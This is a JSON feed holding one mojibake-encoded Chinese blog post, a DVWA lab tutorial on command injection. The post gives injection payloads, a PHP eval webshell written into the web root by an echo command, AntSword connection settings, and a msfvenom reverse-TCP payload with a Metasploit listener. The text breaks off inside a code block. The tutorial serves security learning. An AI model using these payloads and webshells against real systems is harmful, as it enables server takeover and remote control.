{
    "version": "https://jsonfeed.org/version/1",
    "title": "baeçš„åšå®¢ â€¢ All posts by \"webå®‰å…¨\" category",
    "description": "baeçš„ä¸ªäººåšå®¢",
    "home_page_url": "https://bae-ace.github.io",
    "items": [
        {
            "id": "https://bae-ace.github.io/2025/07/26/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/",
            "url": "https://bae-ace.github.io/2025/07/26/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/",
            "title": "å‘½ä»¤æ‰§è¡Œæ¼æ´",
            "date_published": "2025-07-26T10:53:13.000Z",
            "content_html": "<h1 id=\"å‘½ä»¤æ‰§è¡Œæ¼æ´è¯¦è§£\"><a href=\"#å‘½ä»¤æ‰§è¡Œæ¼æ´è¯¦è§£\" class=\"headerlink\" title=\"å‘½ä»¤æ‰§è¡Œæ¼æ´è¯¦è§£\"></a>å‘½ä»¤æ‰§è¡Œæ¼æ´è¯¦è§£</h1><h2 id=\"ğŸ¯-å‰è¨€\"><a href=\"#ğŸ¯-å‰è¨€\" class=\"headerlink\" title=\"ğŸ¯ å‰è¨€\"></a>ğŸ¯ å‰è¨€</h2><p>å‘½ä»¤æ‰§è¡Œæ¼æ´æ˜¯Webå®‰å…¨é¢†åŸŸä¸­çš„ä¸€ç§é«˜å±æ¼æ´ï¼Œå®ƒå…è®¸æ”»å‡»è€…åœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤ã€‚æœ¬æ–‡å°†æ·±å…¥è§£æå‘½ä»¤æ‰§è¡Œæ¼æ´çš„åŸç†ã€æˆå› ã€åˆ©ç”¨æ–¹æ³•ä»¥åŠé˜²æŠ¤ç­–ç•¥ï¼Œå¹¶é€šè¿‡DVWAé¶åœºç¯å¢ƒè¿›è¡Œå®æˆ˜æ¼”ç¤ºã€‚</p>\n<hr>\n<h2 id=\"ğŸ“‹-ç›®å½•\"><a href=\"#ğŸ“‹-ç›®å½•\" class=\"headerlink\" title=\"ğŸ“‹ ç›®å½•\"></a>ğŸ“‹ ç›®å½•</h2><ol>\n<li><a href=\"https://claude.ai/chat/d5068d44-b35a-4d8e-9e2d-89fe67d23495#%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0\">æ¼æ´æ¦‚è¿°</a></li>\n<li><a href=\"https://claude.ai/chat/d5068d44-b35a-4d8e-9e2d-89fe67d23495#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86\">æ¼æ´åŸç†</a></li>\n<li><a href=\"https://claude.ai/chat/d5068d44-b35a-4d8e-9e2d-89fe67d23495#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA\">ç¯å¢ƒæ­å»º</a></li>\n<li><a href=\"https://claude.ai/chat/d5068d44-b35a-4d8e-9e2d-89fe67d23495#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98\">æ¼æ´åˆ©ç”¨å®æˆ˜</a></li>\n<li><a href=\"https://claude.ai/chat/d5068d44-b35a-4d8e-9e2d-89fe67d23495#%E5%90%8E%E6%B8%97%E9%80%8F%E6%93%8D%E4%BD%9C\">åæ¸—é€æ“ä½œ</a></li>\n<li><a href=\"https://claude.ai/chat/d5068d44-b35a-4d8e-9e2d-89fe67d23495#%E9%98%B2%E6%8A%A4%E6%8E%AA%E6%96%BD\">é˜²æŠ¤æªæ–½</a></li>\n<li><a href=\"https://claude.ai/chat/d5068d44-b35a-4d8e-9e2d-89fe67d23495#%E6%80%BB%E7%BB%93\">æ€»ç»“</a></li>\n</ol>\n<hr>\n<h2 id=\"ğŸ”-æ¼æ´æ¦‚è¿°\"><a href=\"#ğŸ”-æ¼æ´æ¦‚è¿°\" class=\"headerlink\" title=\"ğŸ” æ¼æ´æ¦‚è¿°\"></a>ğŸ” æ¼æ´æ¦‚è¿°</h2><h3 id=\"ä»€ä¹ˆæ˜¯å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Ÿ\"><a href=\"#ä»€ä¹ˆæ˜¯å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Ÿ\" class=\"headerlink\" title=\"ä»€ä¹ˆæ˜¯å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Ÿ\"></a>ä»€ä¹ˆæ˜¯å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Ÿ</h3><p>å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆCommand Execution&#x2F;Command Injectionï¼‰æ˜¯æŒ‡å½“Webåº”ç”¨ç¨‹åºéœ€è¦è°ƒç”¨ç³»ç»Ÿå‘½ä»¤æ¥å®ŒæˆæŸäº›åŠŸèƒ½æ—¶ï¼Œç”±äºå¯¹ç”¨æˆ·è¾“å…¥çš„è¿‡æ»¤ä¸ä¸¥æ ¼ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„çš„å‘½ä»¤å‚æ•°ï¼Œä»è€Œåœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤çš„å®‰å…¨æ¼æ´ã€‚</p>\n<h3 id=\"æ¼æ´å±å®³\"><a href=\"#æ¼æ´å±å®³\" class=\"headerlink\" title=\"æ¼æ´å±å®³\"></a>æ¼æ´å±å®³</h3><ul>\n<li><strong>æœåŠ¡å™¨å®Œå…¨æ§åˆ¶</strong>ï¼šè·å¾—æœåŠ¡å™¨çš„å‘½ä»¤æ‰§è¡Œæƒé™</li>\n<li><strong>æ•°æ®æ³„éœ²</strong>ï¼šè®¿é—®æ•æ„Ÿæ–‡ä»¶å’Œæ•°æ®åº“ä¿¡æ¯</li>\n<li><strong>æƒé™æå‡</strong>ï¼šé€šè¿‡ç³»ç»Ÿæ¼æ´è¿›ä¸€æ­¥æå‡æƒé™</li>\n<li><strong>æ¨ªå‘ç§»åŠ¨</strong>ï¼šä»¥è¢«æ”»é™·æœåŠ¡å™¨ä¸ºè·³æ¿æ”»å‡»å†…ç½‘å…¶ä»–ç³»ç»Ÿ</li>\n<li><strong>æ¶æ„è½¯ä»¶æ¤å…¥</strong>ï¼šä¸Šä¼ åé—¨ç¨‹åºæˆ–æ¶æ„è½¯ä»¶</li>\n</ul>\n<hr>\n<h2 id=\"âš™ï¸-æ¼æ´åŸç†\"><a href=\"#âš™ï¸-æ¼æ´åŸç†\" class=\"headerlink\" title=\"âš™ï¸ æ¼æ´åŸç†\"></a>âš™ï¸ æ¼æ´åŸç†</h2><h3 id=\"æŠ€æœ¯åŸç†\"><a href=\"#æŠ€æœ¯åŸç†\" class=\"headerlink\" title=\"æŠ€æœ¯åŸç†\"></a>æŠ€æœ¯åŸç†</h3><p>å‘½ä»¤æ‰§è¡Œæ¼æ´çš„æ ¹æœ¬åŸå› åœ¨äºåº”ç”¨ç¨‹åºç›´æ¥å°†ç”¨æˆ·è¾“å…¥ä½œä¸ºç³»ç»Ÿå‘½ä»¤çš„å‚æ•°ï¼Œè€Œæ²¡æœ‰è¿›è¡Œé€‚å½“çš„è¿‡æ»¤å’ŒéªŒè¯ã€‚</p>\n<h4 id=\"å…¸å‹çš„è„†å¼±ä»£ç ç¤ºä¾‹ï¼š\"><a href=\"#å…¸å‹çš„è„†å¼±ä»£ç ç¤ºä¾‹ï¼š\" class=\"headerlink\" title=\"å…¸å‹çš„è„†å¼±ä»£ç ç¤ºä¾‹ï¼š\"></a>å…¸å‹çš„è„†å¼±ä»£ç ç¤ºä¾‹ï¼š</h4><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><br><span class=\"hljs-comment\">// è·å–ç”¨æˆ·è¾“å…¥çš„IPåœ°å€</span><br><span class=\"hljs-variable\">$target</span> = <span class=\"hljs-variable\">$_REQUEST</span>[<span class=\"hljs-string\">&#x27;ip&#x27;</span>];<br><br><span class=\"hljs-comment\">// ç›´æ¥å°†ç”¨æˆ·è¾“å…¥æ‹¼æ¥åˆ°ç³»ç»Ÿå‘½ä»¤ä¸­</span><br><span class=\"hljs-variable\">$cmd</span> = <span class=\"hljs-title function_ invoke__\">shell_exec</span>(<span class=\"hljs-string\">&#x27;ping -c 4 &#x27;</span> . <span class=\"hljs-variable\">$target</span>);<br><br><span class=\"hljs-comment\">// è¾“å‡ºç»“æœ</span><br><span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">&quot;&lt;pre&gt;<span class=\"hljs-subst\">$cmd</span>&lt;/pre&gt;&quot;</span>;<br><span class=\"hljs-meta\">?&gt;</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"å‘½ä»¤è¿æ¥ç¬¦\"><a href=\"#å‘½ä»¤è¿æ¥ç¬¦\" class=\"headerlink\" title=\"å‘½ä»¤è¿æ¥ç¬¦\"></a>å‘½ä»¤è¿æ¥ç¬¦</h3><p>æ”»å‡»è€…é€šå¸¸åˆ©ç”¨ä»¥ä¸‹å‘½ä»¤è¿æ¥ç¬¦æ¥æ³¨å…¥æ¶æ„å‘½ä»¤ï¼š</p>\n<table>\n<thead>\n<tr>\n<th>è¿æ¥ç¬¦</th>\n<th>è¯´æ˜</th>\n<th>ç¤ºä¾‹</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><code>;</code></td>\n<td>å‘½ä»¤åˆ†éš”ç¬¦</td>\n<td><code>127.0.0.1; whoami</code></td>\n</tr>\n<tr>\n<td><code>&amp;&amp;</code></td>\n<td>é€»è¾‘ä¸ï¼Œå‰ä¸€ä¸ªå‘½ä»¤æˆåŠŸåæ‰§è¡Œåä¸€ä¸ª</td>\n<td><code>127.0.0.1 &amp;&amp; whoami</code></td>\n</tr>\n<tr>\n<td>&#96;</td>\n<td></td>\n<td>&#96;</td>\n</tr>\n<tr>\n<td>&#96;</td>\n<td>&#96;</td>\n<td>ç®¡é“ç¬¦ï¼Œå°†å‰ä¸€ä¸ªå‘½ä»¤çš„è¾“å‡ºä½œä¸ºåä¸€ä¸ªå‘½ä»¤çš„è¾“å…¥</td>\n</tr>\n<tr>\n<td><code>&amp;</code></td>\n<td>åå°æ‰§è¡Œ</td>\n<td><code>127.0.0.1 &amp; whoami</code></td>\n</tr>\n<tr>\n<td><code>$()</code></td>\n<td>å‘½ä»¤æ›¿æ¢</td>\n<td><code>127.0.0.1$(whoami)</code></td>\n</tr>\n<tr>\n<td><code> </code></td>\n<td>åå¼•å·å‘½ä»¤æ›¿æ¢</td>\n<td><code>127.0.0.1</code>whoami<code> </code></td>\n</tr>\n</tbody></table>\n<hr>\n<h2 id=\"ğŸŒ-ç¯å¢ƒæ­å»º\"><a href=\"#ğŸŒ-ç¯å¢ƒæ­å»º\" class=\"headerlink\" title=\"ğŸŒ ç¯å¢ƒæ­å»º\"></a>ğŸŒ ç¯å¢ƒæ­å»º</h2><h3 id=\"é¶åœºç¯å¢ƒé…ç½®\"><a href=\"#é¶åœºç¯å¢ƒé…ç½®\" class=\"headerlink\" title=\"é¶åœºç¯å¢ƒé…ç½®\"></a>é¶åœºç¯å¢ƒé…ç½®</h3><p><strong>ç³»ç»Ÿç¯å¢ƒï¼š</strong></p>\n<ul>\n<li>æ“ä½œç³»ç»Ÿï¼šWindows 7</li>\n<li>WebæœåŠ¡å™¨ï¼šPHPStudy</li>\n<li>é¶åœºç¨‹åºï¼šDVWA</li>\n<li>DVWAè·¯å¾„ï¼š<code>C:\\download\\phpstudy\\phpstudy_pro\\WWW\\DVWA</code></li>\n<li>è®¿é—®åœ°å€ï¼š<code>http://192.168.147.136/DVWA/</code></li>\n</ul>\n<h3 id=\"ç¯å¢ƒå‡†å¤‡æ­¥éª¤\"><a href=\"#ç¯å¢ƒå‡†å¤‡æ­¥éª¤\" class=\"headerlink\" title=\"ç¯å¢ƒå‡†å¤‡æ­¥éª¤\"></a>ç¯å¢ƒå‡†å¤‡æ­¥éª¤</h3><ol>\n<li><strong>å®‰è£…PHPStudy</strong><ul>\n<li>ä¸‹è½½å¹¶å®‰è£…PHPStudyé›†æˆç¯å¢ƒ</li>\n<li>å¯åŠ¨Apacheå’ŒMySQLæœåŠ¡</li>\n</ul>\n</li>\n<li><strong>éƒ¨ç½²DVWA</strong><ul>\n<li>ä¸‹è½½DVWAæºç </li>\n<li>è§£å‹åˆ°PHPStudyçš„WWWç›®å½•</li>\n<li>é…ç½®æ•°æ®åº“è¿æ¥</li>\n</ul>\n</li>\n<li><strong>è®¾ç½®å®‰å…¨ç­‰çº§</strong><ul>\n<li>ç™»å½•DVWAç®¡ç†ç•Œé¢</li>\n<li>å¯¼èˆªè‡³DVWA Security</li>\n<li>å°†å®‰å…¨ç­‰çº§è®¾ç½®ä¸ºLow</li>\n</ul>\n</li>\n</ol>\n<hr>\n<h2 id=\"ğŸ’¥-æ¼æ´åˆ©ç”¨å®æˆ˜\"><a href=\"#ğŸ’¥-æ¼æ´åˆ©ç”¨å®æˆ˜\" class=\"headerlink\" title=\"ğŸ’¥ æ¼æ´åˆ©ç”¨å®æˆ˜\"></a>ğŸ’¥ æ¼æ´åˆ©ç”¨å®æˆ˜</h2><h3 id=\"ç¬¬ä¸€æ­¥ï¼šè®¿é—®æ¼æ´é¡µé¢\"><a href=\"#ç¬¬ä¸€æ­¥ï¼šè®¿é—®æ¼æ´é¡µé¢\" class=\"headerlink\" title=\"ç¬¬ä¸€æ­¥ï¼šè®¿é—®æ¼æ´é¡µé¢\"></a>ç¬¬ä¸€æ­¥ï¼šè®¿é—®æ¼æ´é¡µé¢</h3><p>æ‰“å¼€æµè§ˆå™¨è®¿é—®å‘½ä»¤æ‰§è¡Œæ¼æ´æµ‹è¯•é¡µé¢ï¼š</p>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs awk\">http:<span class=\"hljs-regexp\">//</span><span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">147.136</span><span class=\"hljs-regexp\">/DVWA/</span>vulnerabilities<span class=\"hljs-regexp\">/exec/</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"ç¬¬äºŒæ­¥ï¼šåŸºç¡€å‘½ä»¤æ³¨å…¥æµ‹è¯•\"><a href=\"#ç¬¬äºŒæ­¥ï¼šåŸºç¡€å‘½ä»¤æ³¨å…¥æµ‹è¯•\" class=\"headerlink\" title=\"ç¬¬äºŒæ­¥ï¼šåŸºç¡€å‘½ä»¤æ³¨å…¥æµ‹è¯•\"></a>ç¬¬äºŒæ­¥ï¼šåŸºç¡€å‘½ä»¤æ³¨å…¥æµ‹è¯•</h3><p>åœ¨è¾“å…¥æ¡†ä¸­è¾“å…¥ä»¥ä¸‹Payloadè¿›è¡Œæµ‹è¯•ï¼š</p>\n<figure class=\"highlight accesslog\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs accesslog\"><span class=\"hljs-number\">127.0.0.1</span> &amp;&amp; whoami<br></code></pre></td></tr></table></figure>\n\n<p><strong>é¢„æœŸç»“æœï¼š</strong></p>\n<figure class=\"highlight routeros\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs routeros\">PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.<br>64 bytes <span class=\"hljs-keyword\">from</span> 127.0.0.1: <span class=\"hljs-attribute\">icmp_seq</span>=1 <span class=\"hljs-attribute\">ttl</span>=64 <span class=\"hljs-attribute\">time</span>=0.042 ms<br><span class=\"hljs-built_in\">..</span>.<br><br>nt authority\\system<br></code></pre></td></tr></table></figure>\n\n<p>å¦‚æœçœ‹åˆ°<code>nt authority\\system</code>è¾“å‡ºï¼Œè¯´æ˜å‘½ä»¤æ³¨å…¥æˆåŠŸï¼</p>\n<h3 id=\"ç¬¬ä¸‰æ­¥ï¼šä¿¡æ¯æ”¶é›†\"><a href=\"#ç¬¬ä¸‰æ­¥ï¼šä¿¡æ¯æ”¶é›†\" class=\"headerlink\" title=\"ç¬¬ä¸‰æ­¥ï¼šä¿¡æ¯æ”¶é›†\"></a>ç¬¬ä¸‰æ­¥ï¼šä¿¡æ¯æ”¶é›†</h3><p>ä½¿ç”¨ä¸åŒçš„å‘½ä»¤æ”¶é›†ç³»ç»Ÿä¿¡æ¯ï¼š</p>\n<figure class=\"highlight ruby\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs ruby\"><span class=\"hljs-comment\"># æŸ¥çœ‹å½“å‰ç”¨æˆ·</span><br><span class=\"hljs-number\">127.0</span>.<span class=\"hljs-number\">0.1</span> &amp;&amp; whoami<br><br><span class=\"hljs-comment\"># æŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯</span><br><span class=\"hljs-number\">127.0</span>.<span class=\"hljs-number\">0.1</span> &amp;&amp; systeminfo<br><br><span class=\"hljs-comment\"># æŸ¥çœ‹ç½‘ç»œé…ç½®</span><br><span class=\"hljs-number\">127.0</span>.<span class=\"hljs-number\">0.1</span> &amp;&amp; ipconfig<br><br><span class=\"hljs-comment\"># æŸ¥çœ‹å½“å‰ç›®å½•</span><br><span class=\"hljs-number\">127.0</span>.<span class=\"hljs-number\">0.1</span> &amp;&amp; dir<br><br><span class=\"hljs-comment\"># æŸ¥çœ‹è¿›ç¨‹åˆ—è¡¨</span><br><span class=\"hljs-number\">127.0</span>.<span class=\"hljs-number\">0.1</span> &amp;&amp; tasklist<br></code></pre></td></tr></table></figure>\n\n<hr>\n<h2 id=\"ğŸ¯-åæ¸—é€æ“ä½œ\"><a href=\"#ğŸ¯-åæ¸—é€æ“ä½œ\" class=\"headerlink\" title=\"ğŸ¯ åæ¸—é€æ“ä½œ\"></a>ğŸ¯ åæ¸—é€æ“ä½œ</h2><h3 id=\"æ–¹æ³•ä¸€ï¼šä¸Šä¼ Webshell\"><a href=\"#æ–¹æ³•ä¸€ï¼šä¸Šä¼ Webshell\" class=\"headerlink\" title=\"æ–¹æ³•ä¸€ï¼šä¸Šä¼ Webshell\"></a>æ–¹æ³•ä¸€ï¼šä¸Šä¼ Webshell</h3><h4 id=\"1-å‡†å¤‡ä¸€å¥è¯æœ¨é©¬\"><a href=\"#1-å‡†å¤‡ä¸€å¥è¯æœ¨é©¬\" class=\"headerlink\" title=\"1. å‡†å¤‡ä¸€å¥è¯æœ¨é©¬\"></a>1. å‡†å¤‡ä¸€å¥è¯æœ¨é©¬</h4><p>åˆ›å»º<code>shell.php</code>æ–‡ä»¶ï¼š</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span> @<span class=\"hljs-keyword\">eval</span>(<span class=\"hljs-variable\">$_POST</span>[<span class=\"hljs-string\">&#x27;pass&#x27;</span>]); <span class=\"hljs-meta\">?&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>æˆ–è€…ä½¿ç”¨Base64ç¼–ç ç‰ˆæœ¬ï¼š</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span> <span class=\"hljs-keyword\">eval</span>(<span class=\"hljs-title function_ invoke__\">base64_decode</span>(<span class=\"hljs-variable\">$_POST</span>[<span class=\"hljs-string\">&#x27;cmd&#x27;</span>])); <span class=\"hljs-meta\">?&gt;</span><br></code></pre></td></tr></table></figure>\n\n<h4 id=\"2-é€šè¿‡å‘½ä»¤æ³¨å…¥ä¸Šä¼ \"><a href=\"#2-é€šè¿‡å‘½ä»¤æ³¨å…¥ä¸Šä¼ \" class=\"headerlink\" title=\"2. é€šè¿‡å‘½ä»¤æ³¨å…¥ä¸Šä¼ \"></a>2. é€šè¿‡å‘½ä»¤æ³¨å…¥ä¸Šä¼ </h4><p>ä½¿ç”¨echoå‘½ä»¤å†™å…¥ä¸€å¥è¯æœ¨é©¬ï¼š</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-number\">127.0</span>.<span class=\"hljs-number\">0.1</span> &amp;&amp; <span class=\"hljs-keyword\">echo</span> ^<span class=\"hljs-meta\">&lt;?php</span> @<span class=\"hljs-keyword\">eval</span>(<span class=\"hljs-variable\">$_POST</span>[<span class=\"hljs-string\">&#x27;pass&#x27;</span>]); ?^&gt; &gt; C:\\download\\phpstudy\\phpstudy_pro\\WWW\\DVWA\\shell.php<br></code></pre></td></tr></table></figure>\n\n<p><strong>æ³¨æ„äº‹é¡¹ï¼š</strong></p>\n<ul>\n<li><code>^</code>ç¬¦å·æ˜¯Windows cmdçš„è½¬ä¹‰ç¬¦</li>\n<li><code>&gt;</code>ç¬¦å·ç”¨äºé‡å®šå‘è¾“å‡ºåˆ°æ–‡ä»¶</li>\n<li>è·¯å¾„å¿…é¡»æ˜¯Webç›®å½•ä¸‹å¯è®¿é—®çš„ä½ç½®</li>\n</ul>\n<h4 id=\"3-éªŒè¯ä¸Šä¼ æˆåŠŸ\"><a href=\"#3-éªŒè¯ä¸Šä¼ æˆåŠŸ\" class=\"headerlink\" title=\"3. éªŒè¯ä¸Šä¼ æˆåŠŸ\"></a>3. éªŒè¯ä¸Šä¼ æˆåŠŸ</h4><p>è®¿é—®ä¸Šä¼ çš„æœ¨é©¬æ–‡ä»¶ï¼š</p>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs awk\">http:<span class=\"hljs-regexp\">//</span><span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">147.136</span><span class=\"hljs-regexp\">/DVWA/</span>shell.php<br></code></pre></td></tr></table></figure>\n\n<p>å¦‚æœé¡µé¢æ˜¾ç¤ºç©ºç™½ï¼Œè¯´æ˜PHPæ–‡ä»¶ä¸Šä¼ æˆåŠŸã€‚</p>\n<h3 id=\"æ–¹æ³•äºŒï¼šä½¿ç”¨èšå‰‘è¿æ¥\"><a href=\"#æ–¹æ³•äºŒï¼šä½¿ç”¨èšå‰‘è¿æ¥\" class=\"headerlink\" title=\"æ–¹æ³•äºŒï¼šä½¿ç”¨èšå‰‘è¿æ¥\"></a>æ–¹æ³•äºŒï¼šä½¿ç”¨èšå‰‘è¿æ¥</h3><h4 id=\"1-é…ç½®èšå‰‘è¿æ¥\"><a href=\"#1-é…ç½®èšå‰‘è¿æ¥\" class=\"headerlink\" title=\"1. é…ç½®èšå‰‘è¿æ¥\"></a>1. é…ç½®èšå‰‘è¿æ¥</h4><p><strong>è¿æ¥å‚æ•°ï¼š</strong></p>\n<ul>\n<li>URL: <code>http://192.168.147.136/DVWA/shell.php</code></li>\n<li>å¯†ç : <code>pass</code></li>\n<li>ç¼–ç : <code>UTF-8</code></li>\n<li>ç±»å‹: <code>PHP</code></li>\n</ul>\n<h4 id=\"2-åŠŸèƒ½æ¼”ç¤º\"><a href=\"#2-åŠŸèƒ½æ¼”ç¤º\" class=\"headerlink\" title=\"2. åŠŸèƒ½æ¼”ç¤º\"></a>2. åŠŸèƒ½æ¼”ç¤º</h4><p>é€šè¿‡èšå‰‘å¯ä»¥å®ç°ï¼š</p>\n<ul>\n<li>æ–‡ä»¶ç®¡ç†ï¼šæµè§ˆã€ä¸Šä¼ ã€ä¸‹è½½ã€ç¼–è¾‘æ–‡ä»¶</li>\n<li>æ•°æ®åº“ç®¡ç†ï¼šè¿æ¥å’Œæ“ä½œæ•°æ®åº“</li>\n<li>è™šæ‹Ÿç»ˆç«¯ï¼šæ‰§è¡Œç³»ç»Ÿå‘½ä»¤</li>\n<li>åå‘ä»£ç†ï¼šå»ºç«‹éš§é“è¿æ¥</li>\n</ul>\n<h3 id=\"æ–¹æ³•ä¸‰ï¼šMSFææƒæ“ä½œ\"><a href=\"#æ–¹æ³•ä¸‰ï¼šMSFææƒæ“ä½œ\" class=\"headerlink\" title=\"æ–¹æ³•ä¸‰ï¼šMSFææƒæ“ä½œ\"></a>æ–¹æ³•ä¸‰ï¼šMSFææƒæ“ä½œ</h3><h4 id=\"1-ç”ŸæˆMeterpreteræœ¨é©¬\"><a href=\"#1-ç”ŸæˆMeterpreteræœ¨é©¬\" class=\"headerlink\" title=\"1. ç”ŸæˆMeterpreteræœ¨é©¬\"></a>1. ç”ŸæˆMeterpreteræœ¨é©¬</h4><p>åœ¨Kali Linuxä¸­æ‰§è¡Œï¼š</p>\n<figure class=\"highlight zsh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs zsh\">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.147.129 LPORT=4444 -f exe &gt; shell.exe<br></code></pre></td></tr></table></figure>\n\n<p><strong>å‚æ•°è¯´æ˜ï¼š</strong></p>\n<ul>\n<li><code>-p</code>: æŒ‡å®šPayloadç±»å‹</li>\n<li><code>LHOST</code>: æ”»å‡»è€…IPåœ°å€</li>\n<li><code>LPORT</code>: ç›‘å¬ç«¯å£</li>\n<li><code>-f</code>: è¾“å‡ºæ ¼å¼</li>\n</ul>\n<h4 id=\"2-ä¸Šä¼ æœ¨é©¬æ–‡ä»¶\"><a href=\"#2-ä¸Šä¼ æœ¨é©¬æ–‡ä»¶\" class=\"headerlink\" title=\"2. ä¸Šä¼ æœ¨é©¬æ–‡ä»¶\"></a>2. ä¸Šä¼ æœ¨é©¬æ–‡ä»¶</h4><p>é€šè¿‡èšå‰‘å°†ç”Ÿæˆçš„<code>shell.exe</code>ä¸Šä¼ åˆ°ç›®æ ‡æœåŠ¡å™¨ï¼š</p>\n<figure class=\"highlight basic\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs basic\">C:\\Users\\Public\\<span class=\"hljs-keyword\">shell</span>.exe<br></code></pre></td></tr></table></figure>\n\n<h4 id=\"3-é…ç½®MSFç›‘å¬å™¨\"><a href=\"#3-é…ç½®MSFç›‘å¬å™¨\" class=\"headerlink\" title=\"3. é…ç½®MSFç›‘å¬å™¨\"></a>3. é…ç½®MSFç›‘å¬å™¨</h4><p>å¯åŠ¨Metasploitï¼š</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">msfconsole<br></code></pre></td></tr></table></figure>\n\n<p>é…ç½®ç›‘å¬å™¨ï¼š</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">use exploit/multi/handler<br><span class=\"hljs-built_in\">set</span> payload windows/meterpreter/reverse_tcp<br><span class=\"hljs-built_in\">set</span> lhost 192.168.147.129<br><span class=\"hljs-built_in\">set</span> lport 4444<br>exploit<br></code></pre></td></tr></table></figure>\n\n<h4 id=\"4-æ‰§è¡Œæœ¨é©¬è·å–Meterpreterä¼šè¯\"><a href=\"#4-æ‰§è¡Œæœ¨é©¬è·å–Meterpreterä¼šè¯\" class=\"headerlink\" title=\"4. æ‰§è¡Œæœ¨é©¬è·å–Meterpreterä¼šè¯\"></a>4. æ‰§è¡Œæœ¨é©¬è·å–Meterpreterä¼šè¯</h4><p>åœ¨èšå‰‘ç»ˆç«¯æˆ–é€šè¿‡å‘½ä»¤æ³¨å…¥æ‰§è¡Œï¼š</p>\n<figure class=\"highlight vbnet\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs vbnet\"><span class=\"hljs-symbol\">C:</span>\\Users\\<span class=\"hljs-keyword\">Public</span>\\shell.exe<br></code></pre></td></tr></table></figure>\n\n<p>æˆåŠŸå»ºç«‹è¿æ¥åï¼Œå¯ä»¥ä½¿ç”¨Meterpreterçš„å¼ºå¤§åŠŸèƒ½ï¼š</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\"><span class=\"hljs-meta prompt_\"># 